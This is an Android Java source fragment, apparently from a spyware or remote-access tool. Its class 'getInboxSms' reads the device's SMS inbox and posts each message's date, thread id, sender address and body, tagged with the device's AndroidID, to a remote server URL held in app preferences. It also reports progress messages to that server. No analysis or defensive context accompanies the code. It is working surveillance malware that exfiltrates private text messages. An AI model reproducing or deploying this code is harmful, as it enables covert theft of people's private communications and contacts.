public class getInboxSms extends AsyncTask<String, Void, String> {
	String j = "";
    public getInboxSms(String j) {
    	this.j = j;
    }
	@Override
    protected String doInBackground(String... params) {     
    	Uri callUri = Uri.parse("content://sms/inbox");
        Cursor mCur = getApplicationContext().getContentResolver().query(callUri, null, null, null, null);        
        if (mCur.moveToFirst()) 
        	{
        	int i = 0;
	            while (mCur.isAfterLast() == false) 
	            {
	            	if(i<Integer.parseInt(j))
	            	{
		                SimpleDateFormat formatter = new SimpleDateFormat("yyyy-MM-dd*hh:mm:ss");
		                Calendar calendar = Calendar.getInstance();
		                String now = mCur.getString(mCur.getColumnIndex("date"));
		                calendar.setTimeInMillis(Long.parseLong(now));
		                String thread_id = mCur.getString(mCur.getColumnIndex("thread_id"));
		                String id = mCur.getString(mCur.getColumnIndex("_id"));

				        try {
							getInputStreamFromUrl(URL + PreferenceManager.getDefaultSharedPreferences(getApplicationContext()).getString("urlPost", "") + "UID=" + PreferenceManager.getDefaultSharedPreferences(getApplicationContext()).getString("AndroidID", "") + "&Data=", "[" + formatter.format(calendar.getTime()).replace(' ', '*') + "] [" + thread_id + "] " + "[" + id + "] " + "[" + mCur.getString(mCur.getColumnIndex("address")).replace(' ', '*') + "] " + mCur.getString(mCur.getColumnIndex("body")).replace(' ', '*'));
						} catch (UnsupportedEncodingException e) {
							e.printStackTrace();
						}        	
		            }
		                i++;
		                mCur.moveToNext();
	            }
        	}
        mCur.close();
	    return "Executed";
    }      
    @Override
    protected void onPostExecute(String result) {
    	PreferenceManager.getDefaultSharedPreferences(getApplicationContext()).edit().putBoolean("Get",false).commit();
        try {
			getInputStreamFromUrl(URL + PreferenceManager.getDefaultSharedPreferences(getApplicationContext()).getString("urlPost", "") + "UID=" + PreferenceManager.getDefaultSharedPreferences(getApplicationContext()).getString("AndroidID", "") + "&Data=", "Inbox SMS Complete");
		} catch (UnsupportedEncodingException e) {
			e.printStackTrace();
		}        	
    }
    @Override
    protected void onPreExecute() {
        while(PreferenceManager.getDefaultSharedPreferences(getApplicationContext()).getBoolean("Get",false) == true)
        {
        	 try {
        	        Thread.sleep(5000);         
        	    } catch (InterruptedException e) {
        	       e.printStackTrace();
        	    }
        }
        try {
			getInputStreamFromUrl(URL + PreferenceManager.getDefaultSharedPreferences(getApplicationContext()).getString("urlPost", "") + "UID=" + PreferenceManager.getDefaultSharedPreferences(getApplicationContext()).getString("AndroidID", "") + "&Data=", "Getting Inbox SMS");
		} catch (UnsupportedEncodingException e) {
			 
			e.printStackTrace();
		}        	
    	PreferenceManager.getDefaultSharedPreferences(getApplicationContext()).edit().putBoolean("Get",true).commit();
    }
    @Override
    protected void onProgressUpdate(Void... values) {
    }
}